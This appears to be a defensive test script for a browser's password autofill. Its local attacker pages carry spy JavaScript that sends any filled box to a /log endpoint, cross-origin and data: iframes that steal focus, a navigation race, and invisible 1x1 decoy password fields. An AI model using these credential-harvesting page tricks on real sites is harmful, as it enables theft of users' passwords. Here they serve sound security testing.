#!/usr/bin/env python3
"""What a saved password never reaches, in a hidden probe: a frame of another
origin, a frame it names "__officeForms", a box kept out of sight ahead of the
real one, and a text box that would show it in clear.

Build first (`./build.sh`), then `python3 Tests/forms_frames_attack.py`.
127.0.0.1:8843 is the site with the saved login; localhost:8843 is the other
origin. Its pages report any box with something in it to /log. The login is
imported into this world's own keychain items (its label, never the real
browser's) and forgotten at the end; the list under a box is read and picked
through the bench's `accounts`. No window is made or shown.
"""
import os
import sys
import threading
import time
import urllib.parse
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import split_view as sv  # noqa: E402

sv.use("frames-attack")

PORT = 8843
USER = "attack-user@example.test"
PASS = "attack-pass-XYZ"
A = f"http://127.0.0.1:{PORT}"
EVIL = f"http://localhost:{PORT}"
LOG = []

FORM = ('<form action="/done" method="post"><input id="u" name="username" type="text">'
        '<input id="p" name="password" type="password"><button>Sign in</button></form>')
# Reports every non-empty box, focuses a box on request.
SPY = ('<script>var where = %r; setInterval(function () {'
       'var v = Array.prototype.map.call(document.querySelectorAll("input"), function (b) { return b.value; }).filter(Boolean);'
       'if (v.length) fetch("/log?w=" + encodeURIComponent(where) + "&v=" + encodeURIComponent(v.join("|")));'
       '}, 100);'
       'addEventListener("message", function (e) { var b = document.getElementById(e.data); if (b) b.focus(); });</script>')


def spy(where): return FORM + SPY % where


PAGES = {
    "/evil": spy("evil"),
    "/evil-auto": spy("evil-auto") + '<script>setTimeout(function(){document.getElementById("p").focus()}, 200);'
                  'setInterval(function(){document.getElementById("p").focus()}, 300);</script>',
    # Cross-origin frame whose child is named __officeForms: an A-origin page.
    "/evil-named-a": spy("evil-named-a") + f'<iframe name="__officeForms" src="{A}/leak-a"></iframe>',
    "/evil-named-x": spy("evil-named-x") + f'<iframe name="__officeForms" src="{EVIL}/evil"></iframe>',
    "/leak-a": spy("leak-a"),
    "/plain-a": FORM,
    "/victim-cross": FORM + f'<iframe id="f" src="{EVIL}/evil" style="width:400px;height:200px"></iframe>',
    "/victim-named-a": FORM + f'<iframe id="f" src="{EVIL}/evil-named-a" style="width:400px;height:300px"></iframe>',
    "/victim-named-x": FORM + f'<iframe id="f" src="{EVIL}/evil-named-x" style="width:400px;height:300px"></iframe>',
    "/victim-sandbox": FORM + '<iframe id="f" sandbox="allow-scripts allow-forms" src="/evil-sb" style="width:400px;height:200px"></iframe>',
    "/evil-sb": spy("sandboxed-same-url"),
    "/victim-data": FORM + '<iframe id="f" src="data:text/html,' + urllib.parse.quote(
        FORM + '<script>addEventListener("message", function (e) { var b = document.getElementById(e.data); if (b) b.focus(); });'
        'setInterval(function(){var v=document.getElementById("p").value; if(v) parent.postMessage("data:"+v,"*");},100);</script>') +
        '" style="width:400px;height:200px"></iframe><script>addEventListener("message",function(e){'
        'if(typeof e.data==="string"&&e.data.indexOf("data:")===0)fetch("/log?w=data-frame&v="+encodeURIComponent(e.data))});</script>',
    "/victim-race": '<iframe id="f" src="/plain-a" style="width:400px;height:200px"></iframe>',
    # Username box says current-password: the password lands in clear text.
    "/text-echo": '<form action="/done" method="post"><input id="u" name="username" type="text" autocomplete="current-password">'
                  '<button>Sign in</button></form>',
    # A 1x1 invisible password box between the name and the real one.
    "/decoy": '<form action="/done" method="post"><input id="u" name="username" type="text">'
              '<input id="d" type="password" style="width:1px;height:1px;opacity:0;position:absolute">'
              '<input id="p" name="password" type="password"><button>Sign in</button></form>',
    "/decoy-text": '<form action="/done" method="post"><input id="u" name="username" type="text">'
                   '<input id="d" type="text" autocomplete="current-password" style="width:1px;height:1px;opacity:0;position:absolute">'
                   '<input id="p" name="password" type="password"><button>Sign in</button></form>',
    # Real sign-ins that must still fill: a form part way through fading in
    # (a hidden probe runs no animations, so held there), a small box, and
    # robots' honeypots (off the page's left edge, visibility hidden,
    # clipped away) ahead of the real password.
    "/fade": '<style>form{opacity:.3}</style>'
             '<form action="/done" method="post"><input id="u" name="username" type="text">'
             '<input id="h1" type="password" tabindex="-1" style="position:absolute;left:-9999px">'
             '<input id="h2" type="password" style="visibility:hidden;position:absolute">'
             '<input id="h3" type="password" style="position:absolute;clip:rect(0 0 0 0)">'
             '<input id="p" name="password" type="password" style="width:60px;height:12px;font-size:9px">'
             '<button>Sign in</button></form>',
    "/masked-text": '<form action="/done" method="post"><input id="u" name="username" type="text">'
                    '<input id="p" type="text" autocomplete="current-password" style="-webkit-text-security:disc">'
                    '<button>Sign in</button></form>',
    "/frame-save": '<iframe id="f" src="/plain-a" style="width:400px;height:200px"></iframe>',
}


class H(BaseHTTPRequestHandler):
    def page(self):
        path, _, q = self.path.partition("?")
        if path == "/log":
            LOG.append(dict(urllib.parse.parse_qsl(q)))
            self.send_response(204); self.end_headers(); return
        inner = PAGES.get(path, f"<p>{path}</p>")
        body = f"<!doctype html><title>{path.strip('/')}</title>{inner}".encode()
        self.send_response(200); self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body))); self.end_headers(); self.wfile.write(body)

    def do_GET(self): self.page()

    def do_POST(self):
        self.rfile.read(int(self.headers.get("Content-Length") or 0)); self.page()

    def log_message(self, *a): pass


def acc(**f): return sv.cmd({"do": "accounts", **f})


def open_page(path, wait=1.6):
    tab = sv.sp("open", url=f"{A}{path}")["resultID"]
    sv.sp("select", id=tab); time.sleep(wait)
    return tab


def offered(r): return bool(r.get("shown")) and any(x.get("login") == USER for x in r.get("rows", []))


def leaked():
    return [l for l in LOG if PASS in l.get("v", "") or USER in l.get("v", "")]


def main():
    t = sv.T()
    srv = ThreadingHTTPServer(("127.0.0.1", PORT), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    csv = f"{sv.SUPPORT}-seed.csv"
    el = lambda id: f"document.getElementById('{id}')"
    try:
        sv.setup(); sv.launch()
        with open(csv, "w") as f:
            f.write(f"url,username,password\n{A}/,{USER},{PASS}\n")
        t.ok("seeded", sv.cmd({"do": "import-file", "path": csv}).get("kept") == 1)

        # 1. Cross-origin / opaque frames: focusing their own box offers nothing.
        for path in ["/victim-cross", "/victim-sandbox", "/victim-data", "/victim-named-a", "/victim-named-x"]:
            tab = open_page(path, 2.0)
            sv.ev(tab, "document.getElementById('f').contentWindow.postMessage('p', '*'); true"); time.sleep(0.8)
            r = acc()
            t.ok(f"{path}: frame's own password box offers nothing", not offered(r), r)
            # Search world in the frame: is __officeForms there? (from main Search world)
            v = sv.cmd({"do": "eval", "id": tab, "world": "search",
                        "js": "(function(){try{var w=document.getElementById('f').contentWindow; var o=w.__officeForms;"
                              "return o===undefined?'undefined':(o===null?'null':(o===w.frames['__officeForms']?'named-child':typeof o));}"
                              "catch(e){return 'threw '+e.name}})()"}).get("value")
            print("     contentWindow.__officeForms from Search world:", v)
            # 2. Offer on the main page's box, then the frame steals focus, then pick.
            sv.ev(tab, "document.activeElement && document.activeElement.blur(); true"); time.sleep(0.4)
            sv.ev(tab, "document.getElementById('p').focus(); true"); time.sleep(0.8)
            r0 = acc()
            t.ok(f"{path}: main box offers", offered(r0), r0)
            sv.ev(tab, "document.getElementById('f').contentWindow.postMessage('p', '*'); true"); time.sleep(0.6)
            act = sv.ev(tab, "document.activeElement && document.activeElement.id")
            r1 = acc()
            print(f"     after steal: active={act} shown={r1.get('shown')}")
            if r1.get("shown"):
                try: acc(pick=0)
                except Exception as e: print("     pick error", e)
                time.sleep(1.0)
            main_vals = sv.ev(tab, "[document.getElementById('u').value, document.getElementById('p').value]")
            print("     main boxes after pick:", main_vals)
            t.ok(f"{path}: nothing reaches the cross-origin frame", not leaked(), leaked())

        # 3. Race: offer in a same-origin frame, frame goes cross-origin, pick.
        tab = open_page("/victim-race", 2.0)
        sv.ev(tab, "document.getElementById('f').contentDocument.getElementById('p').focus(); true"); time.sleep(0.8)
        r = acc()
        t.ok("/victim-race: same-origin frame offers", offered(r), r)
        sv.ev(tab, f"document.getElementById('f').src = '{EVIL}/evil-auto'; true"); time.sleep(1.5)
        r = acc()
        print("     after the frame went cross-origin: shown =", r.get("shown"), "active =",
              sv.ev(tab, "document.activeElement && document.activeElement.id"))
        if r.get("shown"):
            try: acc(pick=0)
            except Exception as e: print("     pick error", e)
            time.sleep(1.0)
        t.ok("/victim-race: nothing reaches the frame after it went cross-origin", not leaked(), leaked())

        # Race variant: list shown, frame navigates during the 0.5 s, pick right after.
        tab = open_page("/victim-race", 2.0)
        sv.ev(tab, "document.getElementById('f').contentDocument.getElementById('p').focus(); true"); time.sleep(0.8)
        t.ok("/victim-race 2: offers", offered(acc()))
        sv.ev(tab, f"document.getElementById('f').src = '{EVIL}/evil-auto'; true"); time.sleep(0.25)
        try: acc(pick=0)
        except Exception as e: print("     pick error", e)
        time.sleep(1.5)
        t.ok("/victim-race 2: nothing reaches the frame", not leaked(), leaked())

        # 4. Text box marked current-password as the only box: password in clear text.
        tab = open_page("/text-echo")
        sv.ev(tab, "document.getElementById('u').focus(); true"); time.sleep(0.8)
        r = acc()
        print("     /text-echo offered:", offered(r))
        if offered(r):
            acc(pick=0); time.sleep(0.6)
        v = sv.ev(tab, "[document.getElementById('u').type, document.getElementById('u').value]")
        t.ok("/text-echo: password NOT put in a plain text box", not (v and v[1] == PASS), v)

        # 5. Decoys.
        for path in ["/decoy", "/decoy-text"]:
            tab = open_page(path)
            sv.ev(tab, "document.getElementById('u').focus(); true"); time.sleep(0.8)
            r = acc()
            if offered(r):
                acc(pick=0); time.sleep(0.6)
            v = sv.ev(tab, "[document.getElementById('u').value, document.getElementById('d').value, document.getElementById('p').value]")
            print(f"     {path}: [u, decoy, real] =", v)
            t.ok(f"{path}: password goes to the visible box, not the 1x1 decoy",
                 v and v[1] != PASS, v)

        # 6. Real forms still fill: a faint form with honeypots, a small box,
        # a text box that masks itself.
        for path in ["/fade", "/masked-text"]:
            tab = open_page(path)
            sv.ev(tab, "document.getElementById('p').focus(); true"); time.sleep(0.8)
            r = acc()
            t.ok(f"{path}: the password box offers", offered(r), r)
            if offered(r):
                acc(pick=0); time.sleep(0.6)
            v = sv.ev(tab, "Array.prototype.map.call(document.querySelectorAll('input'), function (b) { return b.id + '=' + b.value; })")
            print(f"     {path}:", v)
            t.ok(f"{path}: the name and password go to the visible boxes",
                 v and f"u={USER}" in v and f"p={PASS}" in v and not any(x.startswith("h") and x.endswith(PASS) for x in v), v)

        # 7. A frame never sends a save.
        tab = open_page("/frame-save", 2.0)
        sv.ev(tab, "var d = document.getElementById('f').contentDocument; var set = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value').set;"
                   "['u','p'].forEach(function (id, i) { var b = d.getElementById(id); b.focus(); set.call(b, i ? 'typed-pass' : 'typed-user');"
                   "b.dispatchEvent(new Event('input', {bubbles: true})); }); d.querySelector('form').requestSubmit(); true")
        time.sleep(3)
        r = acc()
        t.ok("/frame-save: a frame's sign-in is never offered a save", not r.get("offer"), r.get("offer"))
        print("     all /log entries:", LOG[:20])
    finally:
        try: acc(forget=True)
        except Exception as e: print("forget failed", e)
        if os.path.exists(csv): os.remove(csv)
        srv.shutdown(); srv.server_close()
        t.done(); sv.finish()
    sys.exit(1 if t.failed else 0)


if __name__ == "__main__":
    main()
